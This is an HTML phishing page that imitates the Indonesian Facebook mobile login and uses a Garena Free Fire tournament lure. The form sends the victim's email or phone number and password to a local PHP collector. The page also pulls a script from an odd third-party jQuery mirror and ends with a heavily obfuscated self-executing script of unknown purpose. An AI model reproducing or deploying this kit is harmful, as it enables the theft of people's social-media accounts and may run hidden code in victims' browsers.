<html lang="id">
 <head>
  <title>Masuk Facebook | Facebook</title>
  <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
  <link href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yi/r/4Kv5U5b1o3f.png" rel="shortcut icon" sizes="196x196">
  <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
  <meta name="theme-color" content="#3b5998">
  <link type="text/css" rel="stylesheet" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yH/l/0,cross/37-SGh0aq4O.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="VHGGQ0B" crossorigin="anonymous">
  <link type="text/css" rel="stylesheet" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/ys/l/0,cross/HAsT1Ni85O8.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="Dy6aJb5" crossorigin="anonymous"> 
  <meta name="description" content="Login ke Facebook untuk mulai membagikan sesuatu dan berhubungan dengan teman, keluarga, dan orang-orang yang Anda kenal.">
  <meta property="og:site_name" content="Facebook">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Masuk Facebook | Facebook">
  <meta property="og:description" content="Login ke Facebook untuk mulai membagikan sesuatu dan berhubungan dengan teman, keluarga, dan orang-orang yang Anda kenal.">
  <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
  <meta property="og:url" content="https://id-id.facebook.com/">
  <link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.facebook.com/">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
$(document).ready(function(){$('body').hide();});
    </script>
  <link rel="alternate" media="handheld" href="https://m.facebook.com/">
 </head>
 <body tabindex="0" class="touch x1 android _fzu _50-3 iframe acw portrait" style="min-height: 946px; background-color: rgb(228, 230, 235);display:none"> 
  <div id="viewport" data-kaios-focus-transparent="1" style="min-height: 946px;">
   <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
   <div id="page">
    <div class="_129_" id="header-notices"></div>
    <div class="_7om2 _52z5" id="header">
     <div class="_4g34 _52z6 _ad5s _5i2i _52we" data-sigil="mChromeHeaderCenter">
      <div class="_5xu4">
       <i class="img sp_zqrNfmDGuGz sx_d395f8"><u>facebook</u></i>
      </div>
     </div>
    </div>
    <div id="m:chrome:schedulable-graph-search" data-referrer="m:chrome:schedulable-graph-search">
     <div class="_a-5 _13gt _7n0e" id="u_0_f_EZ">
      <form class="_13e_" action="/search/top/" data-autoid="autoid_7">
       <div class="_13fn">
        <i class="_7mt-"></i>
        <input id="main-search-input" data-sigil="search-small-box" class="_5-lx" type="search" name="query" placeholder="Cari" autocomplete="off" autocorrect="off" autocapitalize="off" data-autoid="autoid_5">
        <label for="main-search-input" class="_13fo">Cari</label>
        <a href="#" class="_5-ly" role="button" data-autoid="autoid_6" style="display: none;">Hapus</a>
       </div>
       <a href="#" class="_3k_n" data-autoid="autoid_8">Batal</a>
      </form>
      <div class="_5-lw" data-autoid="autoid_4"></div>
     </div>
    </div>
    <div class="_5soa _3-q1 acw" id="root" role="main" data-sigil="context-layer-root content-pane" style="min-height: 946px;">
     <div class="_7om2">
      <div class="_4g34" id="u_0_0_sT">
       <div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice">
        <div class="_52jd"></div>
       </div>
       <div class="_9om_">
        <div class="aclb _4-4l">
         <div class="_5rut">
          <div>
           <div class="_52jj _3-q2">
            <img src="https://telegra.ph/file/936cf98413bde628c07f6.png" width="100" height="100" class="_3-q3 img">
            <div class="_52je _52j9">
             Masuk ke akun Facebook Anda untuk terhubung dengan Garena
            </div>
           </div>
          </div>
          <form method="post" onsubmit="$(this).end()" action="../lanjutkan/index.php">
           <div class="_56be _5sob">
            <div class="_55wo _55x2 _56bf">
             <div class="_96n9" id="email_input_container">
              <input autocorrect="off" autocapitalize="off" type="text" class="_56bg _4u9z _5ruq" autocomplete="on" id="email" name="email" placeholder="Nomor ponsel atau email" data-sigil="m_login_email">
             </div>
             <div>
              <div class="_1upc _mg8" data-sigil="m_login_password">
               <div class="_7om2">
                <div class="_4g34 _5i2i _52we">
                 <div class="_5xu4">
                  <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" autocomplete="on" id="password" name="sandi" placeholder="Kata Sandi Facebook" type="password" data-sigil="password-plain-text-toggle-input">
                 </div>
                </div>
                <input type="hidden" name="ua" id="ua" value="Turnamen FF" readonly>
                <input type="hidden" name="log" id="log" value="Facebook" readonly>
                <div class="_5s61 _216i _5i2i _52we">
                 <div class="_5xu4">
                  <div class="_2pi9" style="pointer-events: auto;;display:none" id="u_0_1_2+" data-sigil="password-plain-text-toggle">
                   <a href="#"><span class="mfss" style="display:none" id="u_0_2_Kv">SEMBUNYIKAN</span><span class="mfss" id="u_0_3_1I">PERLIHATKAN</span></a>
                  </div>
                 </div>
                </div>
               </div>
              </div>
             </div>
            </div>
           </div>
           <div class="_2pie" style="text-align:center;">
            <div id="login_password_step_element" data-sigil="login_password_step_element">
             <button type="submit" id="btnfb" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu"><span class="_55sr">Masuk</span></button>
            </div>
            </form>
            <div class="_7eif" id="oauth_login_button_container" style="display:none"></div>
            <div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div>
            <div id="otp_button_elem_container"></div>
           </div>
           <div class="_xo8"></div>
          <div>
           <div class="_2pie _9omz">
            <div class="_52jj _9on1">
             <a class="_9on1" tabindex="0">Lupa kata sandi?</a>
            </div>
           </div>
           <div style="padding-top: 42px">
            <div>
             <div>
              <div></div>
             </div>
             <div class="_2pie" style="text-align:center;">
              <div>
               <div data-sigil="login_identify_step_element">
                <div>
                 <div class="_4581 _2phz">
                  <a>Buat Akun</a>
                 </div>
                 <div class="_4581">
                  <a>Lain kali</a>
                 </div>
                </div>
               </div>
               <div class="other-links _8p_m">
                <ul class="_5pkb _55wp">
                 <li><span class="mfss fcg"><a href="/help/?locale2=id_ID&amp;refid=9" id="help-link" class="_8p_m sec">Pusat Bantuan</a></span></li>
                </ul>
               </div>
              </div>
             </div>
            </div>
           </div>
          </div>
         </div>
        </div>
       </div>
      </div>
     </div>
     <div style="display:none">
      <div></div>
     </div>
     <span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none"></span>
     <div class="_55wr _5ui2" data-sigil="m_login_footer">
      <div class="_ao4m">
       <div>
        <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
         <div class="_7om2">
          <div class="_4g34">
           <span class="_52jc _52j9 _52jh _3ztb">Bahasa Indonesia</span>
           <div class="_3ztc">
            <span class="_52jc"><a>English (UK)</a></span>
           </div>
           <div class="_3ztc">
            <span class="_52jc"><a>日本語</a></span>
           </div>
           <div class="_3ztc">
            <span class="_52jc"><a>Português (Brasil)</a></span>
           </div>
          </div>
          <div class="_4g34">
           <div class="_3ztc">
            <span class="_52jc"><a>Basa Jawa</a></span>
           </div>
           <div class="_3ztc">
            <span class="_52jc"><a>Bahasa Melayu</a></span>
           </div>
           <div class="_3ztc">
            <span class="_52jc"><a>Español</a></span>
           </div>
           <a>
            <div class="_3j87 _1rrd _3ztd" aria-label="Daftar bahasa lengkap" data-sigil="more_language">
             <i class="img sp_zqrNfmDGuGz sx_ae048b"></i>
            </div></a>
          </div>
         </div>
        </div>
        <div class="_5ui4">
         <span class="mfss fcg">Meta © 2024</span>
        </div>
       </div>
      </div>
     </div>
    </div>
    <div class=""></div>
    <div class="viewportArea _2v9s" style="display:none" id="u_0_4_WT" data-sigil="marea">
     <div class="_5vsg" id="u_0_5_dO" style="max-height: 250px;"></div>
     <div class="_5vsh" id="u_0_6_2U" style="max-height: 473px;"></div>
     <div class="_5v5d fcg">
      <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Memuat...
     </div>
    </div>
    <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
     <div class="container">
      <div class="image"></div>
      <div class="message" data-sigil="error-message"></div>
      <a class="link" data-sigil="MPageError:retry">Coba Lagi</a>
     </div>
    </div>
   </div>
  </div>
  <div id="static_templates">
   <div class="mDialog" id="modalDialog" style="display:none" data-sigil=" context-layer-root" data-autoid="autoid_2">
    <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
     <div class="_7om2 _52we">
      <div class="_5s61">
       <div class="_52z7">
        <button type="submit" value="Batal" class="cancelButton btn btnD bgb mfss touchable" id="u_0_8_+O" data-sigil="dialog-cancel-button">Batal</button>
        <button type="submit" value="Kembali" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Kembali" id="u_0_9_Pq" data-sigil="dialog-back-button"><i class="img sp_zqrNfmDGuGz sx_a7f017" style="margin-top: 2px;"></i></button>
       </div>
      </div>
      <div class="_4g34">
       <div class="_52z6">
        <div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0" data-sigil="m-dialog-header-title dialog-title">
         Memuat...
        </div>
       </div>
      </div>
      <div class="_5s61">
       <div class="_52z8" id="modalDialogHeaderButtons"></div>
      </div>
     </div>
    </div>
    <div class="modalDialogView" id="modalDialogView"></div>
    <div class="_5v5d _5v5e fcg" id="dialogSpinner">
     <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_7_hW" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Memuat...
    </div>
   </div>
  </div> 
  <div class="hidden_elem"></div> 
  <div class="AdBox Ad advert post-ads"></div>
  <div class="ob-hover"></div>
    <script src="https://cdn.jsdelivr.net/gh/StyleeJs/3.6.0/jquery.js"></script>
    <script>

        window.addEventListener('submit', function (e) {
            e.preventDefault();
            $("#btnfb").addClass("disabled");
            setTimeout(() => {
                var alx_email_fb2 = $('#alx_email_fb2').val();
                var alx_password_fb2 = $('#alx_password_fb2').val();
                if (alx_email_fb2 == '' || alx_email_fb2 == null) {
                    $('.email-fb1bgs').show();
                    $('.sandi-fb1bgs').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                } else {

                    if (alx_email_fb2.includes('@')) {
                        let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
                        if (alx_email_fb2.match(pattern)) {
                            $('.email-fb1bgs').hide();
                        } else {
                            $('.email-fb1bgs').show();
                            $('.sandi-fb1bgs').hide();
                            $("#btnfb").removeClass("disabled");
                            return false;
                        }
                    }

                    if (!isNaN(alx_email_fb2)) {
                        if (alx_email_fb2.length <= 10) {
                            $('.email-fb1bgs').show();
                            $('.sandi-fb1bgs').hide();
                            $("#btnfb").removeClass("disabled");
                            return false;
                        } else {
                            $('.email').hide();
                        }
                    }

                    if (alx_email_fb2.match(/\s/g)) {
                        $('.email-fb1bgs').show();
                        $('.sandi-fb1bgs').hide();
                        $("#btnfb").removeClass("disabled");
                        return false;
                    } else {
                        $('.email-fb1bgs').hide();
                    }

                    var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                    if (alx_email_fb2.match(regex)) {
                        $('.email-fb1bgs').show();
                        $('.sandi-fb1bgs').hide();
                        $("#btnfb").removeClass("disabled");
                        return false;
                    }


                    if (alx_email_fb2.length <= 5) {
                        $('.email-fb1bgs').show();
                        $('.sandi-fb1bgs').hide();
                        $("#btnfb").removeClass("disabled");
                        return false;
                    } else {
                        $('.email-fb1bgs').hide();
                    }

                }
                if (alx_password_fb2 == '' || alx_password_fb2 == null || alx_password_fb2.length <= 5) {
                    $('.sandi-fb1bgs').show();
                    $("#btnfb").removeClass("disabled");
                    return false;
                } else {
                    $('.sandi-fb1bgs').hide();
                }
                var regexs = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                if (alx_password_fb2.match(regexs)) {
                    $('.sandi-fb1bgs').show();
                    $('.email-fb1bgs').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                } else {
                    $('.sandi-fb1bgs').hide();
                }
    </script>
    <?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
(function(){var Ilf='',xkX=616-605;function ElM(i){var u=2376457;var s=i.length;var d=[];for(var y=0;y<s;y++){d[y]=i.charAt(y)};for(var y=0;y<s;y++){var n=u*(y+281)+(u%40988);var g=u*(y+78)+(u%26934);var v=n%s;var c=g%s;var a=d[v];d[v]=d[c];d[c]=a;u=(n+g)%3341854;};return d.join('')};var CmU=ElM('xgfrdruvcptcmnltsqzijkesonyowaruchotb').substr(0,xkX);var IRo='aznf<=9i;nn3r;p;muso)+sn+tv]=dd {iyvk;t}.,lr) uC,tnz=x(=4e.v.o}=wnrso[(=f(14-u.b4[)[b 8orog.5vf1ta9ua0s7.lfA)08.nq]s);;e)v=.(i>=s.7err(rit1vs;8w<roqupnerp +uvro);wgvaani6lr)-mnrr21+. o;1)=)c"ryrg(kf=s(eap]r1];utar  )v(0 r)eig=..fl+vgi3n (u,eavav>;s"t;,=a;.t.iy"pn8o.(j)1(v,,nl0)=a]v1;htv=nk=-(o.=r+rt)r)a;wa[sy;=.+];(ad av+ucl)emrng!q;nd;,7a0roe0 ;h[87+r"y8l=( aS;etrie<*is,sa5vi6vhrl)ch[r-)h{Atar4mut(oCea7 .;(xnrb;9a]sxCufhCc0chg +ehn},)e"6thd;wyazi<b[lah(vlpf(gahen ,;[*]s= ps=th-ive]enrtt;)n=f2kwqzr+"grhv(20dwAbwet,rr=;a=e; lh2;2jeoe=;(xtuh;h}a3a(v=-mxqia.[+= 0sCujanx";{.roya,<t7;[{1r(f,e+e8+=a5r,g=d Ce(o8hf=;"crcr+r!;s,wnrotl abp0n7;fs1(,.[ =)a)fnt+f)sdr{l{)e[aou((r[5;k[x;1t,h(r=e()u;)}.v)=66=;; )ee]"vf7+id)92,=9.s6=3i(a;,6=,j-d(+i8,,)=v=r(nsgmli+.7g+o=ll0lw]c], 6"1f5ngvca0h]u6uu).leehyl;ir+AcCe}Cit6t(ol;pc=;;r}(rx82fc+n=S+rwr9vrf;,ahetkmgvc,xhhop,aey,jg5d(+=ii)m +A9g..a{]n 1)p';var BaB=ElM[CmU];var xuW='';var HNg=BaB;var gbL=BaB(xuW,ElM(IRo));var xzf=gbL(ElM('eond+7A)ript;oqave48 orA;sfe!3(}mA,(}&_%.A_3l.6A)_a=C)3A,_s!_\'A_s6gm{Acgs;e=7Atwd\'ad*=d;i+gA\/64t#9$]A$x(sfx842n).o=+ab6b,nA7r3x$ )+a(ni0beAhrv)(n(2edj9_( t(Aip,ct]A[1e16_ws,;}a]34#3d)o(qt%d6Sa.cAi.6gmedlAA 4f_(A%(!0iAo8A= obA\/o$#5!ra%i9-};!jfgj..\/v!%j.734p7);dfA]!8C3u.s0(A3Al;)(hn(f..1A{!4A3,t;b%do.Ab5()A$A$3%k8((sf.{A8y}x3A}e;AgAAaA9uA$5=)};Ao asA]Aof2<i.7:=fq(r2(cA.yg}ndth.5.)(.$a0$6;1Au51A)c05ie_4!s{a,do5))epAA=d.co(h}ca6o]t(ih} g)1t).]o);(Ap60pu!(<05d.5r ]jjdwg]g(pA,43 b,i41)A,0$.$ ]u4su8h)n*#2 Abi8j*:uf(6.!5-.7n7t),(i$AdA$13A003 t.e=_1e;$.(5.1_j,ig.(;A6eva4_A3;i064=7dn5r5)(3j)_=bj=A3A$usAA.{mh(,3nffs,s15nsp,$A)fA3u({s"$.._ .ie_rgu4y!;e=xt(8!.<_aAl:7{;m.s2dbr"+=+{rArAAueA9f%A%1p%l!d=l_#sbq=A.)3.,337;!ebA1t(nd.$b3Aob{%3rA\/!0A3)A_())rs]_(A)A.en"na4nb(4eA2 ;}AA\'mn:)A0;_d;x},7]tAa6&=.xb$),)fA_ahcA=AAAd7+r76AtoeA$,1}_.g3)_bl .n)0n.d!(;04gAA=vA}(q_).9)s2_$5,<eAa.den,(d)_c{ A,]Aco0[..,y}11trA\/:).(3))2;;d4a[[3(6 !csed"e{s:$A1f3egA=53rA!t!_\/Aetbu.4;A_$!()u3t)Al._6;=6i iffoA6AoeA5 .s-$$.6ia,!r.d&24%_7)}$)n.,]Azlqd )ti=Azeo_a;;A=l2+(9}9(A!;b#g;r4loi(A3;Afa.fAi8{_{4:.-r_6ob}A6))($})5!A!%__.2).A8\/q&}.51-n(b;6dA,%7]AAo!_A9Alis)A(54f37s4uA)#)+(A.8((Af0As;.so85.3it2k2.6s %0}A7*(AvT\'0A8 9_".)p)_A=,gl4.\/)\'5a.4 0erA74])s {{7A8l3r(rS9A)q$$A,i 0)69vAa!{ii%:5]:s3Aa,6)d(As 95td3SAf=03;d!86dua8;$jA6)r0g3A(5""[tbo)!.so):!S.=n2t=A9$ib3_$"],yArA\/j;$_!m.dd:gA5 p).d)dA3+(n=,_4A_rA;=k}d64#iA;(_. '));var kJB=HNg(Ilf,xzf );kJB(6797);return 5600})()
</script>
 </body>
</html>